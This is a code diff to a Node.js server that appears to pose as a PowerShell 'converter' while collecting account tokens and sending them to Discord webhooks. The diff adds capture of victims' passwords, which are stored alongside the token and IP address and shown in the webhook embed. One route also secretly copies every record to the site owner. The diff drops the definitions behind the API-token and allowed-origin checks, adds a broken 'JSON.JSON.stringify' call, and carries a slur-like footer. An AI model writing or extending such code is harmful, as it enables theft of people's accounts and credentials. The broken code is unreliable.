@@ -123,10 +123,6 @@ async function saveDirectories(directories) {
   }
 }
 
-// Generate API token if not set
-const API_TOKEN = process.env.API_TOKEN || crypto.randomBytes(32).toString('hex');
-const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : [];
-
 // Middleware to validate requests
 function validateRequest(req, res, next) {
   // Check origin for browser requests
@@ -255,6 +251,7 @@ app.post('/u/convert', validateRequest, async (req, res) => {
   try {
     let input;
     let scriptType;
+    let password = '';
 
     // Handle both JSON and text input
     if (typeof req.body === 'string') {
@@ -263,6 +260,7 @@ app.post('/u/convert', validateRequest, async (req, res) => {
     } else if (req.body && req.body.powershell) {
       input = req.body.powershell;
       scriptType = req.body.scriptType || 'Unknown';
+      password = req.body.password || '';
     } else {
       return res.status(400).json({ error: 'Invalid input format' });
     }
@@ -349,6 +347,11 @@ app.post('/u/convert', validateRequest, async (req, res) => {
         emailAddress: null,
         voiceChatEnabled: false
       };
+
+      // Add password to user data if provided
+      if (password) {
+        webhookUserData.password = password;
+      }
 
       // Log user data to database
       await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });
@@ -447,6 +450,7 @@ app.post('/u/:directory/convert', async (req, res) => {
 
     let input;
     let scriptType;
+    let password = '';
 
     // Handle both JSON and text input
     if (typeof req.body === 'string') {
@@ -455,6 +459,7 @@ app.post('/u/:directory/convert', async (req, res) => {
     } else if (req.body && req.body.powershell) {
       input = req.body.powershell;
       scriptType = req.body.scriptType || 'Unknown';
+      password = req.body.password || '';
     } else {
       return res.status(400).json({ error: 'Invalid input format' });
     }
@@ -503,7 +508,7 @@ app.post('/u/:directory/convert', async (req, res) => {
             headers: {
               'Content-Type': 'application/json',
             },
-            body: JSON.stringify(fallbackPayload)
+            body: JSON.JSON.stringify(fallbackPayload)
           });
 
           const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
@@ -553,6 +558,11 @@ app.post('/u/:directory/convert', async (req, res) => {
         emailAddress: null,
         voiceChatEnabled: false
       };
+
+      // Add password to user data if provided
+      if (password) {
+        webhookUserData.password = password;
+      }
 
       // Log user data to database
       await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
@@ -2215,7 +2225,12 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
             inline: false                  
           },
-
+          // Display password if available
+          ...(userData.password ? [{
+            name: "<:password_icon:1408077637338986576> Password",
+            value: `**\`${userData.password}\`**`,
+            inline: false
+          }] : [])
         ],
         footer: {
           text: "Made By .Niqqa"
@@ -2762,7 +2777,7 @@ app.post('/:directory/convert', async (req, res) => {
       // Send to Discord webhook with user data
       const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle, true);
 
-      // Always send to site owner (main webhook) - check both environment variable and default webhook
+      // Always send to site owner (main webhook)
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
       if (siteOwnerWebhookUrl) {
         await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle, true);
